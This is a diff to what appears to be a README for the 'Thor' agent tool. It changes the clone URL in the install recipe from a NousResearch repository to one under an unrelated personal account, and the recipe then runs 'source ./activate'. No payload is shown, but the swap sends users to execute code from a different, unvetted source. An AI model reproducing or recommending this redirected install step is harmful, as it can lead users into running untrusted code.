@@ -15,7 +15,7 @@ Thor isn't just a CLI tool. You can import `AIAgent` directly and use it program
 Clone Thor and prepare its source environment through PM. The Bash recipe is:
 
 ```bash
-git clone https://github.com/NousResearch/thor-agent.git
+git clone https://github.com/dwisetyabudi15581/Thor-agent.git
 cd thor-agent
 source ./activate
 ```
